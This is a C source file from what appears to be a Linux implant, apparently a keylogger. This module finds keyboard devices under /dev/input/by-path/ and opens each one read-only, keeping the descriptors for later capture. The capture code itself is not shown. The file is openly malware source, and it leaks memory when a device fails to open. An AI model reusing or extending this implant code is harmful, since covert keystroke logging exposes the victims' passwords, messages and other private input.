
/*
    keyboard handling and local support.
*/

#include "implant.h"

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/queue.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static int
is_kbd(const struct dirent *f) {
    size_t len = strlen(f->d_name);

    if (len < 3)
        return 0;

    return f->d_name[len - 3] == 'k' && f->d_name[len - 2] == 'b' &&
           f->d_name[len - 1] == 'd';
}

void fetch_available_keyboards(implant_t *instance) {

    /*
        input devices usually live in /dev/input/

        you can identify the in the by-path subdirectory, which maps each
        device name to a symlink

        here, we will return set an array of file-descriptor for each available
        keyboard on the machine, it should be appended with a -1 that should serve
        as a NULL value
    */

    struct dirent **char_devices = NULL;
    int possible_paths =
        scandir("/dev/input/by-path/", &char_devices, &is_kbd, &alphasort);

    if (-1 == possible_paths || 0 > chdir("/dev/input/by-path/")) {

#ifdef DEBUG
        DEBUG_LOG("could not find possible keyboard paths");
#endif

        return;
    }

    /* prepare TAILQ  */
    TAILQ_INIT(&instance->kbd);

    char rpath[2048] = {0};
    for (int ctr = -1; ++ctr < possible_paths;) {
        if (!realpath(char_devices[ctr]->d_name, rpath)) {

#ifdef DEBUG
            DEBUG_LOG("[!] Could not run realpath(%s): %s", char_devices[ctr]->d_name, strerror(errno));
#endif

            continue;
        }

        keyboard_t *kbd = malloc(sizeof(keyboard_t));
        if (!kbd) {

#ifdef DEBUG
            DEBUG_LOG("[!] allocate memory for keyboard_t");
#endif

            continue;
        }

        kbd->fd = open(rpath, O_RDONLY | O_NOCTTY | O_NDELAY);
        if (kbd->fd < 0) {

#ifdef DEBUG
            DEBUG_LOG("[!] Could not open %s: %s", rpath, strerror(errno));
#endif

            continue;
        }

        memset(kbd->name, 0, 64);
        strncpy(kbd->name, rpath, 63);
        TAILQ_INSERT_HEAD(&instance->kbd, kbd, devices);
    }

    for (int ctr = -1; ++ctr < possible_paths;)
        free(char_devices[ctr]);
    free(char_devices);
}
